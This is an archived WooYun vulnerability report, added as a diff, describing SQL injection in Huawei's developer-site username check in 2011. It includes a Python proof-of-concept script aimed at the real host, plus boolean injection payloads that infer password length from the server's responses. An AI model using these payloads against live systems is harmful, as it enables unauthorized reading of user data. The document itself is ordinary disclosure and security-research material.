@@ -1,0 +1,230 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		华为智慧云存在SQL注入  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		华为智慧云存在SQL注入  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/Matrix">Matrix</a> 
+</li><li>提交时间：		2011-08-18 08:45</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2011-08-18：	细节已通知厂商并且等待厂商处理中<br/>
+									2011-08-18：	厂商已经确认，细节仅向厂商公开<br/>
+									2011-08-28：	细节向核心白帽子及相关领域专家公开<br/>
+									2011-09-07：	细节向普通白帽子公开<br/>
+									2011-09-17：	细节向实习白帽子公开<br/>
+									2011-09-17：	细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">华为智慧云存在SQL注入，理论上可修改后台数据</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">http://developer.huaweidevice.com/dev_creg.php<br />
+<br />
+<br />
+<br />
+用户名验证POST数据不严格，提交地址 /dev_creg/preg.php?ckuser=1<br />
+<br />
+<br />
+<br />
+参考如下测试脚本：<br />
+<br />
+</p><pre><code>import httplib, urllib<br />
+import sys<br />
+<br />
+if len(sys.argv) &lt; 2:<br />
+    exit(0)<br />
+<br />
+headers = {<br />
+    &quot;Accept&quot;: &quot;*/*&quot;,<br />
+    &quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.8&quot;,<br />
+    &quot;Referer&quot;: &quot;http://developer.huaweidevice.com/dev_creg.php&quot;,<br />
+    &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.112 Safari/535.1&quot;,<br />
+    &quot;Content-Type&quot;: &quot;application/x-www-form-urlencoded&quot;,<br />
+    &quot;X-Requested-With&quot;: &quot;XMLHttpRequest&quot;,<br />
+    <br />
+}<br />
+params=urllib.urlencode({<br />
+    &quot;username&quot;: sys.argv[1],<br />
+})<br />
+conn = httplib.HTTPConnection(&#039;developer.huaweidevice.com&#039;)<br />
+conn.request(&quot;POST&quot;, &quot;/dev_creg/preg.php?ckuser=1&quot;, params, headers)<br />
+<br />
+response = conn.getresponse()<br />
+data = response.read()<br />
+try:<br />
+    print data.decode(&quot;utf-8&quot;)<br />
+except Exception:<br />
+    print dat</code></pre><p class='detail'> </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail">test.py &quot;.a&#039;&quot;<br />
+<br />
+返回错误信息：&lt;b&gt;SQL&lt;/b&gt;: select uid  from [Table]members  where username=&#039;.a&#039;&#039; &lt;br /&gt;<br />
+<br />
+<br />
+<br />
+D:\&gt;test.py &quot;.a&#039;or&#039;1&#039;=&#039;1&quot;<br />
+<br />
+{&quot;code&quot;:0,&quot;msg&quot;:&quot;昵称不合法或者已存在&quot;}<br />
+<br />
+<br />
+<br />
+后台有简单过滤遇到空格会截断。<br />
+<br />
+<br />
+<br />
+D:\&gt;test.py &quot;.a&#039;or(length(password)=32)or&#039;2&#039;=&#039;1&quot;<br />
+<br />
+{&quot;code&quot;:0,&quot;msg&quot;:&quot;昵称不合法或者已存在&quot;}<br />
+<br />
+<br />
+<br />
+D:\&gt;test.py &quot;.a&#039;or(length(password)=31)or&#039;2&#039;=&#039;1&quot;<br />
+<br />
+{&quot;code&quot;:1,&quot;msg&quot;:&quot;恭喜该名字可以注册!&quot;}<br />
+<br />
+<br />
+<br />
+D:\&gt;test.py &quot;.a&#039;or(length(password)=33)or&#039;2&#039;=&#039;1&quot;<br />
+<br />
+{&quot;code&quot;:1,&quot;msg&quot;:&quot;恭喜该名字可以注册!&quot;} </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">建议做SQL过滤 </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/Matrix" title="Matrix">Matrix</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-02682" title="华为智慧云存在SQL注入">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：中</p>
+						<p class="detail">漏洞Rank：8 </p>
+													<p class="detail">确认时间：2011-08-18 14:01</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail">感谢业界对华为信息安全的关注，我们将尽快修复漏洞</p>
+					
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+											<p class="detail">暂无</p>
+					
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="2682";
+var bugRating="-3";
+var myRating="";
+var ratingCount="0";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
